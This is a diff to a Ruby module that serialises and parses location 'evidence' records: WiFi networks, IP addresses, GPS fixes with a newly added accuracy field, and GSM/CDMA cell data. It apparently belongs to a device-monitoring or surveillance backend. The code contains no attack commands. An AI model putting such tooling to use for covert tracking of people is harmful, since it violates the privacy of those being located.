@@ -22,7 +22,7 @@ module PositionEvidence
       when LOCATION_GPS
         content.write [@loc_type, 0, 0].pack('L*')
         content.write Time.now.getutc.to_filetime.pack('L*')
-        content.write GPS_Position.struct(45.12345, 9.54321)
+        content.write GPS_Position.struct(45.12345, 9.54321, rand(10..100))
         content.write [ ELEM_DELIMITER ].pack('L')
 
       when LOCATION_GSM, LOCATION_CDMA
@@ -75,12 +75,11 @@ module PositionEvidence
 
   def decode_content(common_info, chunks)
     stream = StringIO.new chunks.join
-    
-    info = Hash[common_info]
-    info[:data] ||= Hash.new
-    
-    case info[:loc_type]
+
+    case common_info[:loc_type]
       when LOCATION_WIFI
+        info = Hash[common_info]
+        info[:data] ||= Hash.new
         info[:data][:type] = 'WIFI'
         info[:data][:wifi] = []
         until stream.eof?
@@ -103,14 +102,22 @@ module PositionEvidence
                                mac[4].unpack('C').first,
                                mac[5].unpack('C').first]
 
-          info[:data][:wifi] << {:mac => mac_s, :sig => sig, :bssid => ssid}
+          info[:data][:wifi] << {:mac => mac_s, :sig => sig, :ssid => ssid}
         end
+        yield info if block_given?
+
       when LOCATION_IP
+        info = Hash[common_info]
+        info[:data] ||= Hash.new
         info[:data][:type] = 'IPv4'
         ip = stream.read_ascii_string
         info[:data][:ip] = ip unless ip.nil?
+        yield info if block_given?
+
       when LOCATION_GPS
         until stream.eof?
+          info = Hash[common_info]
+          info[:data] ||= Hash.new
           info[:data][:type] = 'GPS'
           type, size, version = stream.read(12).unpack('L*')
           low, high = *stream.read(8).unpack('L*')
@@ -119,11 +126,16 @@ module PositionEvidence
           gps.read stream
           info[:data][:latitude] = "%.7f" % gps.latitude
           info[:data][:longitude] = "%.7f" % gps.longitude
+          info[:data][:accuracy] = "%d" % gps.accuracy
           delim = stream.read(4).unpack('L').first
           raise EvidenceDeserializeError.new("Malformed LOCATION GPS (missing delimiter)") unless delim == ELEM_DELIMITER
+          yield info if block_given?
         end
+
       when LOCATION_GSM, LOCATION_CDMA
         until stream.eof?
+          info = Hash[common_info]
+          info[:data] ||= Hash.new
           info[:data][:type] = (info[:loc_type] == LOCATION_GSM) ? 'GSM' : 'CDMA'
           type, size, version = stream.read(12).unpack('L*')
           low, high = *stream.read(8).unpack('L*')
@@ -139,12 +151,12 @@ module PositionEvidence
 
           delim = stream.read(4).unpack('L').first
           raise EvidenceDeserializeError.new("Malformed LOCATION CELL (missing delimiter)") unless delim == ELEM_DELIMITER
+          yield info if block_given?
         end
       else
         raise EvidenceDeserializeError.new("Unsupported LOCATION type (#{info[:loc_type]})")
     end
     
-    yield info if block_given?
     :delete_raw
   end
 end
@@ -153,12 +165,13 @@ class GPS_Position
 
   attr_reader :latitude
   attr_reader :longitude
+  attr_reader :accuracy
   
   def self.size
-    self.struct(0,0).bytesize
+    self.struct(0,0,0).bytesize
   end
 
-  def self.struct(lat, long)
+  def self.struct(lat, long, accuracy)
     str = ''
     str += [0].pack('l')  # DWORD dwVersion;  Current version of GPSID client is using.
     str += [0].pack('l')  # DWORD dwSize;     sizeof(_GPS_POSITION)
@@ -178,7 +191,7 @@ class GPS_Position
     str += [0].pack('l')  # GPS_FIX_TYPE        FixType;           // Is this 2d or 3d fix?
     str += [0].pack('l')  # GPS_FIX_SELECTION   SelectionType;     // Auto or manual selection between 2d or 3d mode
     str += [0].pack('F')  # float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
-    str += [0].pack('F')  # float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
+    str += [accuracy].pack('F')  # float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
     str += [0].pack('F')  # float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision
 
     str += [1].pack('l')  # DWORD dwSatelliteCount;                // Number of satellites used in solution
@@ -202,7 +215,9 @@ class GPS_Position
     stream.read(2*4)
 
     stream.read(3*4)
-    stream.read(3*4)
+    stream.read(4)                                # PDOP
+    @accuracy = stream.read(4).unpack('F').first  # HDOP
+    stream.read(4)                                # VDOP
 
     stream.read(4)
     stream.read(12*4)
